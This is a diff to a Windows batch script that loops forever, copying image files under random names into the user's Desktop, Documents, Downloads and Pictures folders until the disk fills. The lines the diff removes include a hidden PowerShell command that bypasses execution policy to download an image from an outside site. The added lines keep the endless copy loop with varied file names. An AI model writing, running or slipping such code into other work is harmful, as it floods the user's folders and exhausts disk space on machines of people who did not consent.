@@ -1,9 +1,7 @@
 @echo off
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "curl -o %TEMP%\image.png https://templeos.org/Templeos-header.png"
-
 :loop
-powershell cp %TEMP%\image.png $env:%USERPROFILE%\Desktop\%random%image.png
-powershell cp %TEMP%\image.png $env:%USERPROFILE%\Documents\%random%image.png
-powershell cp %TEMP%\image.png $env:%USERPROFILE%\Downloads\%random%image.png
-powershell cp %TEMP%\image.png $env:%USERPROFILE%\Pictures\%random%image.png
+powershell cp %TEMP%\image.png $env:%USERPROFILE%\Desktop\%random%1.png
+powershell cp %TEMP%\image2.jpg $env:%USERPROFILE%\Documents\%random%3.jpg
+powershell cp %TEMP%\image3.jpg $env:%USERPROFILE%\Downloads\%random%2.jpg
+powershell cp %TEMP%\image.png $env:%USERPROFILE%\Pictures\%random%1.png
 goto loop
